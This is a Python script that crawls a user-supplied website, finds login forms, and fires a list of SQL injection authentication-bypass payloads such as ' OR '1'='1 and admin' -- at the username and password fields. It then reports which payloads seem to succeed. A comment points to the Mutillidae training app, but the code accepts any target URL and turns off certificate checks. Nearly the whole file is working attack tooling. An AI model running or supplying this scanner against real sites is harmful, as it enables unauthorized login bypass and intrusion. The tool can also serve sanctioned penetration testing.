import requests
from bs4 import BeautifulSoup
import logging
import re
import os
from modules.crawler import spider  # added import for spider

# Configure logging
logging.basicConfig(filename='sqli_log.txt', level=logging.ERROR, format='%(asctime)s - %(message)s')

# SQLi payloads to test
sqli_payloads = ["asdasds",
    "' OR 1---",
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "admin' --",
    "' OR 1=1#",
    "' OR 1=1/*"
]

# Success/failure clues
success_clues = [
    "you are logged in as admin",
    "dashboard",
    "logged in as",
    "you have successfully logged in",
    "admin panel",
    "logout"
]

failure_clues = [
    "not logged in",
    "login failed",
    "invalid password",
    "try again"
]

def detect_login_form(url):
    print(f"🔎 Scanning {url} for login forms across the website...\n")
    # logging.info(f"Scanning URL: {url}")

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (SQLi Tester)',
        'Referer': url,
        'Origin': url.split('/index')[0]
    })

    # Discover pages using spider
    print("🔎 Running spider to discover website pages...")
    results = spider(session, url, max_depth=2, delay=0.5)
    all_pages = set(results.keys())
    for links in results.values():
        all_pages.update(links)
    if not all_pages:
        all_pages = {url}

    found_form = False
    for page in all_pages:
        try:
            # logging.info(f"Scanning {page} for login forms...")
            resp = session.get(page, timeout=10, verify=False)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, 'html.parser')

            for form in soup.find_all('form'):
                inputs = form.find_all('input')
                username_field = None
                password_field = None
                for input_field in inputs:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name', '').lower()
                    if not username_field and any(k in input_name for k in ['user', 'email', 'login']):
                        username_field = input_field.get('name')
                    if input_type == 'password':
                        password_field = input_field.get('name')
                if username_field and password_field:
                    print(f"✅ Login form found on {page}! Testing payloads...\n")
                    form_action = form.get('action')
                    form_method = form.get('method', 'get').lower()
                    full_action_url = form_action if 'http' in form_action else requests.compat.urljoin(page, form_action)
                    # logging.info(f"Login form detected on {page}. Action URL: {full_action_url}, Method: {form_method.upper()}")
                    test_login_sqli(session, full_action_url, form_method, username_field, password_field)
                    found_form = True
        except Exception as e:
            logging.error(f"Error processing page {page}: {str(e)}")

    if not found_form:
        print("❌ No login forms found on the website.")
        # logging.info("No login form found on any scanned page.")

def test_login_sqli(session, action_url, method, user_field, pass_field):
    report = []

    for payload in sqli_payloads:
        data = {
            user_field: payload,
            pass_field: payload,
            'login-php-submit-button': 'Login'  # required by Mutillidae
        }

        try:
            if method == 'post':
                res = session.post(action_url, data=data, allow_redirects=True)
            else:
                res = session.get(action_url, params=data, allow_redirects=True)

            content_len = len(res.text)
            status_code = res.status_code
            is_redirect = status_code == 302

            # Normalize whitespace
            content = re.sub(r'\s+', ' ', res.text.lower())

            # Detect clues
            triggered_success = next((clue for clue in success_clues if clue in content), None)
            triggered_failure = next((clue for clue in failure_clues if clue in content), None)

            content_clue = triggered_success is not None and triggered_failure is None
            suspicious = is_redirect or content_clue

            # Commented out saving raw response for inspection
            # filename = os.path.join("responses", f"{payload.replace(' ', '_').replace('/', '_')}.html")
            # os.makedirs("responses", exist_ok=True)
            # with open(filename, "w", encoding="utf-8") as f:
            #     f.write(res.text)

            # Debug info
            print(f"✅ Triggered success clue: {triggered_success}" if triggered_success else "❌ No success clue found.")
            print(f"❌ Triggered failure clue: {triggered_failure}" if triggered_failure else "✅ No failure clue matched.")

            log_message = (
                f"\n🔹 Payload: {payload}\n"
                f"Method: {method.upper()}\n"
                f"URL: {action_url}\n"
                f"Data: {data}\n"
                f"Status Code: {status_code}, Length: {content_len}\n"
                f"Triggered Success Clue: {triggered_success or 'None'}\n"
                f"Triggered Failure Clue: {triggered_failure or 'None'}\n"
                f"Suspicious: {'Yes' if suspicious else 'No'}\n"
                # f"Saved response: {filename}"
            )

            print(log_message)
            # logging.info(log_message)

            report.append({
                'payload': payload,
                'status_code': status_code,
                'content_length': content_len,
                'suspicious': suspicious
            })

        except requests.exceptions.RequestException as e:
            print(f"⚠️ Request failed for payload '{payload}': {e}")
            logging.error(f"Request failed for payload '{payload}': {e}")

    # Final report
    print("\n🧾 Final SQL Injection Test Report:\n")
    for entry in report:
        verdict = "⚠️ Possible SQLi" if entry['suspicious'] else "✅ Safe"
        print(f"Payload: {entry['payload']}")
        print(f"Status Code: {entry['status_code']}")
        print(f"Response Length: {entry['content_length']}")
        print(f"Result: {verdict}\n")
        # logging.info(f"Payload: {entry['payload']} - Result: {verdict}")

# Example usage
if __name__ == "__main__":
    target_url = input("🌐 Enter URL to scan for login form: ").strip()
    detect_login_form(target_url)
